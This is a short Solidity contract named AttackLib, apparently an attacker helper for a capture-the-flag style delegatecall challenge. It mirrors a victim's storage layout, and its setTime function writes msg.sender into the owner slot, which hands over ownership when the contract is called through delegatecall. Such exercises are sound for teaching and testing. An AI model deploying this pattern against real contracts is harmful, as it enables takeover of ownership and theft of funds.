pragma solidity ^0.8.0;

contract AttackLib {
    uint public timeZone1Library;
    uint public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}
